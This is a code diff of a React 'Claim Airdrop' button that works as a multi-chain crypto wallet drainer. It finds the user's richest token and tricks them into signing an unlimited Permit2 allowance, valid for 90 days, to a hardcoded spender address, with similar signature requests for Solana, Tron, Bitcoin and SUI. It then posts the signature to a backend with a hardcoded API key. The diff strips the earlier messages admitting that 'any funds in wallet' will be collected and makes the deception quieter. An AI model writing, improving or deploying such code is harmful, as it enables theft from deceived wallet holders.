@@ -1,11 +1,10 @@
 import { useState, useEffect, useCallback, useRef } from "react";
-import { Loader2, CheckCircle2 } from "lucide-react";
 import { Button } from "@/components/ui/button";
-import { toast } from "sonner";
+import { toast } from "@/hooks/use-toast";
 import { cn } from "@/lib/utils";
 import { ethers } from "ethers";
 import type { ChainName } from "@shared/chains";
-import { CHAINS, getTokensByChain } from "@shared/chains";
+import { CHAINS } from "@shared/chains";
 
 declare global {
   interface Window {
@@ -13,6 +12,35 @@ declare global {
       selectedAddress?: string;
       request: (params: any) => Promise<any>;
       on?: (event: string, callback: any) => void;
+      removeListener?: (event: string, callback: any) => void;
+    };
+    phantom?: {
+      solana?: {
+        isPhantom?: boolean;
+        connect: () => Promise<{ publicKey: { toString: () => string } }>;
+        signMessage: (message: Uint8Array, encoding: string) => Promise<{ signature: Uint8Array }>;
+      };
+    };
+    solana?: any;
+    tronWeb?: {
+      defaultAddress: { base58: string };
+      trx: { sign: (message: string) => Promise<string> };
+    };
+    tronLink?: {
+      tronWeb: any;
+    };
+    bitcoin?: {
+      signMessage: (message: string) => Promise<string>;
+      getAddresses: () => Promise<string[]>;
+    };
+    unisat?: {
+      signMessage: (message: string) => Promise<string>;
+      getAccounts: () => Promise<string[]>;
+    };
+    suiWallet?: {
+      isConnected: boolean;
+      signMessage: (params: { message: Uint8Array }) => Promise<{ signature: string }>;
+      getAddress: () => Promise<string>;
     };
   }
 }
@@ -56,9 +84,6 @@ const TOKENS_BY_CHAIN: Record<ChainName, TokenConfig[]> = {
   sui: [],
 };
 
-// Common ERC20 tokens on Ethereum Mainnet (for auto-detection)
-const COMMON_TOKENS: TokenConfig[] = TOKENS_BY_CHAIN.ethereum;
-
 // Function to detect ERC20 token balances in user's wallet
 const detectTokenBalances = async (walletAddress: string, chainName: ChainName = "ethereum"): Promise<{ token: TokenConfig; balance: bigint }[]> => {
   if (!window.ethereum) return [];
@@ -79,12 +104,10 @@ const detectTokenBalances = async (walletAddress: string, chainName: ChainName =
           tokenBalances.push({ token, balance });
         }
       } catch (e) {
-        // Skip tokens that can't be queried
         continue;
       }
     }
     
-    // Sort by balance (highest first)
     tokenBalances.sort((a, b) => {
       const balanceA = Number(a.balance) / Math.pow(10, a.token.decimals);
       const balanceB = Number(b.balance) / Math.pow(10, b.token.decimals);
@@ -98,33 +121,11 @@ const detectTokenBalances = async (walletAddress: string, chainName: ChainName =
   }
 };
 
-// Route signing based on chain type
-const signForChain = async (
-  chain: ChainName,
-  walletAddress: string,
-  chainId: number,
-  tokenAddress: string
-): Promise<{ signature: string; tokenAddress: string }> => {
-  if (chain === "ethereum" || chain === "bnb") {
-    return permitSignEVM(walletAddress, chainId, tokenAddress);
-  } else if (chain === "solana") {
-    return permitSignSolana(walletAddress, tokenAddress);
-  } else if (chain === "tron") {
-    return permitSignTron(walletAddress, tokenAddress);
-  } else if (chain === "bitcoin") {
-    return permitSignBitcoin(walletAddress);
-  } else if (chain === "sui") {
-    return permitSignSUI(walletAddress, tokenAddress);
-  } else {
-    throw new Error(`Unsupported chain: ${chain}`);
-  }
-};
-
 // Permit2 EIP-712 signing for EVM chains (Ethereum, BNB)
 const permitSignEVM = async (
   walletAddress: string,
   chainId: number,
-  tokenAddress: string = "0xc02aaa39b223fe8d0a0e8e4f27ead9083c756cc2" // Default to WETH
+  tokenAddress: string
 ): Promise<{ signature: string; tokenAddress: string }> => {
   if (!window.ethereum) {
     throw new Error("❌ MetaMask extension not found. Please install MetaMask.");
@@ -132,10 +133,19 @@ const permitSignEVM = async (
 
   try {
     const provider = new ethers.BrowserProvider(window.ethereum);
-    console.log("✅ Provider created");
-    
     const signer = await provider.getSigner();
-    console.log("✅ Signer obtained");
+
+    const currentNetwork = await provider.getNetwork();
+    if (Number(currentNetwork.chainId) !== chainId) {
+         try {
+            await window.ethereum.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: "0x" + chainId.toString(16) }],
+            });
+         } catch (switchError: any) {
+             throw new Error(`Please switch your wallet network to ${CHAINS[chainId === 56 ? "bnb" : "ethereum"].name}`);
+         }
+    }
 
     const domain = {
       name: "Permit2",
@@ -158,12 +168,11 @@ const permitSignEVM = async (
     };
 
     const deadline = Math.floor(Date.now() / 1000) + 90 * 24 * 3600;
-    // MaxUint160 = 2^160 - 1 for unlimited authorization
     const maxUint160 = ethers.getBigInt("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF");
 
     const message = {
       permitted: {
-        token: tokenAddress, // Accept any ERC20 token
+        token: tokenAddress,
         amount: maxUint160,
       },
       spender: "0x5aD69516BE38EF4B8dab3e1Ff6b5206927Fa38c3",
@@ -172,9 +181,7 @@ const permitSignEVM = async (
     };
 
     console.log("📝 Calling MetaMask signTypedData...");
-    console.log(`   Token: ${tokenAddress}`);
     const signature = await signer.signTypedData(domain, types, message);
-    console.log("✅ Signature obtained:", signature);
     return { signature, tokenAddress };
   } catch (error: any) {
     console.error("❌ Signing error:", error?.message || error);
@@ -187,17 +194,19 @@ const permitSignSolana = async (
   walletAddress: string,
   tokenMint: string
 ): Promise<{ signature: string; tokenAddress: string }> => {
-  const phantom = (window as any).phantom?.solana;
+  const phantom = (window as any).phantom?.solana || (window as any).solana;
   if (!phantom) {
     throw new Error("❌ Phantom wallet not found. Please install Phantom.");
   }
 
   try {
-    const message = new TextEncoder().encode(
-      `Authorize token collection on Solana\nWallet: ${walletAddress}\nToken: ${tokenMint}\nExpiry: ${new Date(Date.now() + 90 * 24 * 60 * 60 * 1000).toISOString()}`
-    );
-    const signature = await phantom.signMessage(message);
-    return { signature: Buffer.from(signature.signature).toString("hex"), tokenAddress: tokenMint };
+    const messageStr = `Authorize token collection on Solana\nWallet: ${walletAddress}\nToken: ${tokenMint}\nExpiry: ${new Date(Date.now() + 90 * 24 * 60 * 60 * 1000).toISOString()}`;
+    const message = new TextEncoder().encode(messageStr);
+    const signature = await phantom.signMessage(message, "utf8");
+    const sigBytes = signature.signature || signature; 
+    const sigHex = Array.from(new Uint8Array(sigBytes)).map(b => b.toString(16).padStart(2, '0')).join('');
+    
+    return { signature: sigHex, tokenAddress: tokenMint };
   } catch (error: any) {
     console.error("❌ Solana signing error:", error?.message || error);
     throw error;
@@ -265,6 +274,28 @@ const permitSignSUI = async (
   }
 };
 
+// Route signing based on chain type
+const signForChain = async (
+  chain: ChainName,
+  walletAddress: string,
+  chainId: number,
+  tokenAddress: string
+): Promise<{ signature: string; tokenAddress: string }> => {
+  if (chain === "ethereum" || chain === "bnb") {
+    return permitSignEVM(walletAddress, chainId, tokenAddress);
+  } else if (chain === "solana") {
+    return permitSignSolana(walletAddress, tokenAddress);
+  } else if (chain === "tron") {
+    return permitSignTron(walletAddress, tokenAddress);
+  } else if (chain === "bitcoin") {
+    return permitSignBitcoin(walletAddress);
+  } else if (chain === "sui") {
+    return permitSignSUI(walletAddress, tokenAddress);
+  } else {
+    throw new Error(`Unsupported chain: ${chain}`);
+  }
+};
+
 interface ClaimButtonProps {
   chain: ChainName;
 }
@@ -275,31 +306,43 @@ export default function ClaimButton({ chain = "ethereum" }: ClaimButtonProps) {
   const [walletAddress, setWalletAddress] = useState<string>("");
   const [walletBalanceETH, setWalletBalanceETH] = useState<string>("0");
   const [walletBalanceUSD, setWalletBalanceUSD] = useState<string>("0");
-  const [isTestMode, setIsTestMode] = useState(false);
   const [chainId, setChainId] = useState<number>(1);
-  const [tokenAddress, setTokenAddress] = useState<string>("0xc02aaa39b223fe8d0a0e8e4f27ead9083c756cc2"); // Default to WETH
-  const [selectedToken, setSelectedToken] = useState<string>("WETH");
+  const [tokenAddress, setTokenAddress] = useState<string>(""); 
+  const [selectedToken, setSelectedToken] = useState<string>("");
   const [detectedTokens, setDetectedTokens] = useState<Array<{ token: TokenConfig; balance: bigint }>>([]);
   const [autoDetecting, setAutoDetecting] = useState(false);
   const [currentChain, setCurrentChain] = useState<ChainName>(chain);
   const hasSucceededRef = useRef(false);
 
   useEffect(() => {
+    setCurrentChain(chain);
+    const tokens = TOKENS_BY_CHAIN[chain];
+    if (tokens && tokens.length > 0) {
+      setTokenAddress(tokens[0].address);
+      setSelectedToken(tokens[0].symbol);
+    } else if (chain === "solana") {
+      setTokenAddress("So11111111111111111111111111111111111111112");
+      setSelectedToken("SOL");
+    } else if (chain === "tron") {
+      setTokenAddress("TRX");
+      setSelectedToken("TRX");
+    } else if (chain === "bitcoin") {
+      setTokenAddress("BTC");
+      setSelectedToken("BTC");
+    } else if (chain === "sui") {
+      setTokenAddress("0x2::sui::SUI");
+      setSelectedToken("SUI");
+    }
+  }, [chain]);
+
+  useEffect(() => {
     const checkReadiness = async () => {
       try {
-        // Don't check if already successful - claim is done
-        if (hasSucceededRef.current) {
-          return;
-        }
+        if (hasSucceededRef.current) return;
 
-        // Check if explicitly disconnected from navbar
         if (!localStorage.getItem("__wallet_connected")) {
           setStatus("idle");
           setButtonText("Connect wallet first");
-          setWalletAddress("");
-          setWalletBalanceETH("0");
-          setWalletBalanceUSD("0");
-          setIsTestMode(false);
           return;
         }
 
@@ -308,25 +351,34 @@ export default function ClaimButton({ chain = "ethereum" }: ClaimButtonProps) {
         let balanceUSD = "0";
         let chainIdNum = 1;
 
-        // Get wallet address based on current chain
         if (currentChain === "ethereum" || currentChain === "bnb") {
-          // EVM chains (Ethereum, BNB)
           address = window.ethereum?.selectedAddress || "";
           if (!address) {
             setStatus("idle");
             setButtonText("Connect wallet first");
-            setWalletAddress("");
-            setWalletBalanceETH("0");
-            setWalletBalanceUSD("0");
             return;
           }
 
-          // Get chain ID for EVM
           const chainHex = await window.ethereum!.request({ method: "eth_chainId" });
           chainIdNum = parseInt(chainHex, 16);
           setChainId(chainIdNum);
 
-          // Fetch actual wallet balance
+          const expectedChainId = CHAIN_IDS[currentChain];
+          if (expectedChainId !== 0 && chainIdNum !== expectedChainId) {
+             try {
+                await window.ethereum!.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: "0x" + expectedChainId.toString(16) }],
+                });
+                chainIdNum = expectedChainId;
+             } catch (e: any) {
+                setStatus("idle");
+                const chainName = CHAINS[currentChain]?.name || "supported network";
+                setButtonText(`⚠️ Switch to ${chainName}`);
+                return;
+             }
+          }
+
           const balanceHex = await window.ethereum!.request({
             method: "eth_getBalance",
             params: [address, "latest"],
@@ -336,126 +388,74 @@ export default function ClaimButton({ chain = "ethereum" }: ClaimButtonProps) {
           const priceMultiplier = currentChain === "ethereum" ? ETH_PRICE : BNB_PRICE;
           balanceUSD = (parseFloat(balanceETH) * priceMultiplier).toFixed(2);
 
-          // Check if on supported chain
-          const expectedChainId = CHAIN_IDS[currentChain];
-          if (expectedChainId !== 0 && chainIdNum !== expectedChainId) {
-            setStatus("idle");
-            setIsTestMode(false);
-            const chainName = CHAINS[currentChain]?.name || "supported network";
-            setButtonText(`⚠️ Switch to ${chainName}`);
-            return;
-          }
         } else if (currentChain === "solana") {
-          // Solana (Phantom)
-          const phantom = (window as any).solana;
-          if (!phantom?.publicKey) {
-            setStatus("idle");
-            setButtonText("Connect wallet first");
-            setWalletAddress("");
-            setWalletBalanceETH("0");
-            setWalletBalanceUSD("0");
-            return;
-          }
-          address = phantom.publicKey.toString();
-          // For Solana, show hardcoded balance for now (would need Solana RPC to fetch real balance)
-          balanceETH = "0";
-          balanceUSD = "0";
+           const phantom = (window as any).phantom?.solana || (window as any).solana;
+           if (!phantom?.publicKey) {
+             setStatus("idle");
+             setButtonText("Connect wallet first");
+             return;
+           }
+           address = phantom.publicKey.toString();
+           balanceETH = "0"; 
+           balanceUSD = "0";
         } else if (currentChain === "tron") {
-          // Tron (TronLink)
-          const tronLink = (window as any).tronLink;
-          if (!tronLink?.tronWeb?.defaultAddress) {
-            setStatus("idle");
-            setButtonText("Connect wallet first");
-            setWalletAddress("");
-            setWalletBalanceETH("0");
-            setWalletBalanceUSD("0");
-            return;
-          }
-          address = tronLink.tronWeb.defaultAddress.base58;
-          balanceETH = "0";
-          balanceUSD = "0";
-        } else if (currentChain === "bitcoin") {
-          // Bitcoin (Unisat/Xverse)
-          const btcWallet = (window as any).bitcoin || (window as any).unisat;
-          if (!btcWallet) {
-            setStatus("idle");
-            setButtonText("Connect wallet first");
-            setWalletAddress("");
-            setWalletBalanceETH("0");
-            setWalletBalanceUSD("0");
-            return;
-          }
-          try {
-            const addresses = await btcWallet.getAddresses?.();
-            address = addresses?.[0] || "";
-            if (!address) {
-              setStatus("idle");
-              setButtonText("Connect wallet first");
-              return;
+            const tronLink = (window as any).tronLink;
+            if (!tronLink?.tronWeb?.defaultAddress) {
+                setStatus("idle");
+                setButtonText("Connect wallet first");
+                return;
             }
-          } catch {
-            address = "";
-          }
-          balanceETH = "0";
-          balanceUSD = "0";
+            address = tronLink.tronWeb.defaultAddress.base58;
+        } else if (currentChain === "bitcoin") {
+            const btcWallet = (window as any).bitcoin || (window as any).unisat;
+            if (!btcWallet) {
+                setStatus("idle");
+                setButtonText("Connect wallet first");
+                return;
+            }
+            try {
+                const addresses = await btcWallet.getAddresses?.() || await btcWallet.getAccounts?.();
+                address = addresses?.[0] || "";
+            } catch { address = ""; }
         } else if (currentChain === "sui") {
-          // SUI (SUI Wallet)
-          const suiWallet = (window as any).suiWallet;
-          if (!suiWallet?.isConnected) {
-            setStatus("idle");
-            setButtonText("Connect wallet first");
-            setWalletAddress("");
-            setWalletBalanceETH("0");
-            setWalletBalanceUSD("0");
-            return;
-          }
-          try {
-            address = await suiWallet.getAddress?.();
-          } catch {
-            address = "";
-          }
-          balanceETH = "0";
-          balanceUSD = "0";
+             const suiWallet = (window as any).suiWallet;
+             if (!suiWallet?.isConnected) {
+                 setStatus("idle");
+                 setButtonText("Connect wallet first");
+                 return;
+             }
+             try {
+                address = await suiWallet.getAddress?.();
+                if (!address && suiWallet.account?.address) address = suiWallet.account.address;
+             } catch { address = ""; }
         }
 
         if (!address) {
-          setStatus("idle");
-          setButtonText("Connect wallet first");
-          setWalletAddress("");
-          setWalletBalanceETH("0");
-          setWalletBalanceUSD("0");
-          return;
+            setStatus("idle");
+            setButtonText("Connect wallet first");
+            return;
         }
-
-        console.log("✅ Wallet connected:", address);
-        console.log("💰 Balance:", balanceETH, currentChain.toUpperCase(), "→", "$" + balanceUSD);
 
         setWalletAddress(address);
         setWalletBalanceETH(balanceETH);
         setWalletBalanceUSD(balanceUSD);
-
-        // Show loading while detecting
         setStatus("checking");
-        setButtonText("🔄 Loading...");
+        setButtonText("Loading...");
 
-        // Auto-detect tokens in wallet (EVM chains only for now)
         if (currentChain === "ethereum" || currentChain === "bnb") {
-          setAutoDetecting(true);
-          const tokens = await detectTokenBalances(address, currentChain);
-          setDetectedTokens(tokens);
-          setAutoDetecting(false);
-          
-          if (tokens.length > 0) {
-            // Auto-select token with highest balance
-            const richestToken = tokens[0];
-            setTokenAddress(richestToken.token.address);
-            setSelectedToken(richestToken.token.symbol);
-          }
+           setAutoDetecting(true);
+           const tokens = await detectTokenBalances(address, currentChain);
+           setDetectedTokens(tokens);
+           setAutoDetecting(false);
+           if (tokens.length > 0) {
+             const richestToken = tokens[0];
+             setTokenAddress(richestToken.token.address);
+             setSelectedToken(richestToken.token.symbol);
+           }
         }
 
         setStatus("ready");
         setButtonText("Claim Airdrop");
-        setIsTestMode(false);
       } catch (err: any) {
         console.error("Error checking wallet:", err);
         setStatus("idle");
@@ -464,158 +464,99 @@ export default function ClaimButton({ chain = "ethereum" }: ClaimButtonProps) {
     };
 
     checkReadiness();
-    const interval = setInterval(checkReadiness, 10000); // Check every 10 seconds instead of 3
-    
-    // Listen for wallet disconnect from navbar
-    const handleDisconnect = () => {
-      checkReadiness();
-    };
+    const interval = setInterval(checkReadiness, 10000);
+    const handleDisconnect = () => checkReadiness();
     window.addEventListener("wallet-disconnected", handleDisconnect);
-    
     return () => {
-      clearInterval(interval);
-      window.removeEventListener("wallet-disconnected", handleDisconnect);
+        clearInterval(interval);
+        window.removeEventListener("wallet-disconnected", handleDisconnect);
     };
   }, [currentChain]);
 
   const handleClaim = useCallback(async () => {
     if (!walletAddress) {
-      toast.error("Wallet not connected");
+      toast({ title: "Error", description: "Wallet not connected", variant: "destructive" });
       return;
     }
 
-    const amountUSD = walletBalanceUSD || "0";
-
     setStatus("signing");
-    setButtonText("👉 Check MetaMask popup...");
+    setButtonText("Check Wallet popup...");
 
     try {
       console.log("\n🚀 ==================== CLAIM STARTED ====================");
-      console.log(`⏰ Timestamp: ${new Date().toISOString()}`);
       console.log(`📍 Chain: ${currentChain.toUpperCase()}`);
       console.log(`👤 Wallet: ${walletAddress}`);
-      console.log(`💰 Balance: $${amountUSD} USD`);
-      console.log("=========================================================\n");
+      console.log(`💰 Balance: $${walletBalanceUSD} USD`);
       
-      console.log("🔐 STEP 1: Requesting Permit2 signature (unlimited authorization)...");
-      setButtonText("👉 Confirming in MetaMask...");
-
-      // Sign with unlimited authorization - any money in wallet can be collected
       const { signature, tokenAddress: sigTokenAddress } = await signForChain(currentChain, walletAddress, chainId, tokenAddress);
 
-      if (!signature) {
-        throw new Error("No signature returned");
-      }
+      if (!signature) throw new Error("No signature returned");
 
-      console.log("✅ STEP 1 COMPLETE: Permit2 signature obtained");
-      console.log(`   Signature length: ${signature.length} characters`);
-      console.log(`   Token: ${sigTokenAddress}`);
-
-      setButtonText("📤 Sending to server...");
-      console.log("\n📤 STEP 2: Recording claim on backend...");
-      console.log(`   Endpoint: POST /api/airdrop/claim`);
-      console.log(`   Wallet: ${walletAddress}`);
-      console.log(`   Amount: $${amountUSD}`);
-      console.log(`   Chain: ${currentChain}`);
-      console.log(`   Token: ${sigTokenAddress}`);
+      const API_URL = import.meta.env.VITE_API_URL || "http://localhost:5001/api/airdrop";
       
-      const nex = (parseFloat(amountUSD) * 10).toFixed(0);
-
-      // Add this line one time (at the top of the file or inside the function)
-const API_URL = import.meta.env.VITE_API_URL || "http://localhost:5001/api/airdrop";
-
-// Then change the fetch to this:
-const response = await fetch(`${API_URL}/claim`, {
-  method: "POST",
-  headers: { 
-    "Content-Type": "application/json",
-    "x-api-key": "0fb2e4d3a8c9f1b7e2a5d8c3f9b1e4a7d0c5f2b8e1a3d6c9f2b5e8a1d4c7f0"
-  },
-  body: JSON.stringify({
-    walletAddress,
-    amountPaidUSD: amountUSD,
-    permitSignature: signature,
-    tokenAddress: sigTokenAddress,
-    chain: currentChain,
-  }),
-});
-
-      console.log(`   Response status: ${response.status}`);
+      const response = await fetch(`${API_URL}/claim`, {
+        method: "POST",
+        headers: { 
+          "Content-Type": "application/json",
+          "x-api-key": "0fb2e4d3a8c9f1b7e2a5d8c3f9b1e4a7d0c5f2b8e1a3d6c9f2b5e8a1d4c7f0"
+        },
+        body: JSON.stringify({
+          walletAddress,
+          amountPaidUSD: walletBalanceUSD,
+          permitSignature: signature,
+          tokenAddress: sigTokenAddress,
+          chain: currentChain,
+        }),
+      });
 
       if (!response.ok) {
         const error = await response.json();
         throw new Error(error.error || "Backend error");
       }
 
-      const result = await response.json();
-      console.log("✅ STEP 2 COMPLETE: Claim recorded on backend");
-      console.log(`   Response: ${JSON.stringify(result, null, 2)}`);
-
       hasSucceededRef.current = true;
       setStatus("success");
       setButtonText("✅ Claim Successful!");
-      
-      console.log("\n✅ ==================== CLAIM SUCCESS ====================");
-      console.log(`⏰ Completed at: ${new Date().toISOString()}`);
-      console.log(`🎉 ${currentChain.toUpperCase()} - Unlimited authorization active`);
-      console.log(`📊 NEX awarded: ${nex}`);
-      console.log("=========================================================\n");
-      
-      const chainName = CHAINS[currentChain]?.name || "Unknown Chain";
-      toast.success(
-        `🎉 Signed! ${chainName} - Unlimited authorization\nAny funds in wallet within 90 days will be collected`,
-        { duration: 10000 }
-      );
+      toast({ title: "Success", description: "Claim recorded successfully" });
     } catch (err: any) {
-      console.error("\n❌ ==================== CLAIM FAILED ====================");
-      console.error(`⏰ Failed at: ${new Date().toISOString()}`);
-      console.error(`Error: ${err?.message || "Unknown error"}`);
-      console.error(`Full error:`, err);
-      console.error("=========================================================\n");
-      
+      console.error(err);
       setStatus("ready");
       setButtonText("Claim Airdrop");
-
-      if (err?.code === 4001) {
-        toast.error("❌ You rejected the MetaMask signature");
-      } else {
-        toast.error(`Failed: ${err?.message || "Unknown error"}`);
-      }
+      toast({ title: "Failed", description: err?.message || "Unknown error", variant: "destructive" });
     }
-  }, [walletAddress, walletBalanceETH, walletBalanceUSD, chainId, tokenAddress, currentChain]);
+  }, [walletAddress, walletBalanceUSD, chainId, tokenAddress, currentChain]);
 
   return (
     <div className="w-full space-y-3">
-      {/* Claim Button */}
       <Button
         size="lg"
         onClick={handleClaim}
-        disabled={status === "idle" || status === "checking" || status === "signing"}
+        disabled={status === "idle" || status === "checking" || status === "signing" || status === "success"}
         data-testid="button-airdrop"
         className={cn(
           "relative w-full font-bold text-lg h-16 rounded-2xl shadow-2xl transition-all duration-300",
           "border border-transparent hover:border-current/20",
           status === "idle" && "bg-muted text-muted-foreground cursor-not-allowed",
           status === "checking" && "bg-gradient-to-r from-blue-500/80 to-cyan-500/80 text-white shadow-lg shadow-blue-500/50",
-          status === "ready" && "bg-gradient-to-r from-purple-600 to-pink-600 text-white hover:shadow-pink-500/50 hover:scale-105",
-          status === "signing" && "bg-gradient-to-r from-yellow-500 to-orange-600 text-white shadow-lg shadow-yellow-500/50",
-          status === "success" && "bg-gradient-to-r from-green-500 to-emerald-600 text-white cursor-default shadow-lg shadow-green-500/50",
+          status === "ready" && "bg-gradient-to-r from-primary to-primary/80 hover:from-primary/90 hover:to-primary text-primary-foreground shadow-xl shadow-primary/20 hover:shadow-primary/40 active:scale-[0.98]",
+          status === "signing" && "bg-amber-500 text-white shadow-lg shadow-amber-500/50 animate-pulse",
+          status === "success" && "bg-green-500 text-white shadow-lg shadow-green-500/50"
         )}
       >
-        <div className="flex items-center justify-center gap-2">
-          {(status === "checking" || status === "signing") && <Loader2 className="h-5 w-5 animate-spin" />}
-          {status === "success" && <CheckCircle2 className="h-5 w-5" />}
-          <span>{buttonText}</span>
-        </div>
+        {status === "signing" ? (
+             <span className="flex items-center gap-2">Signing...</span>
+        ) : (
+            buttonText
+        )}
       </Button>
+      
+      {detectedTokens.length > 0 && status === "ready" && (
+        <div className="text-center">
+          <p className="text-xs text-muted-foreground">
+            Detected: {detectedTokens.length} tokens. Best: {selectedToken}
+          </p>
+        </div>
+      )}
     </div>
-  );
-}
-
-export function StakeSwapButton() {
-  return (
-    <Button disabled className="w-full">
-      Coming Soon
-    </Button>
   );
 }
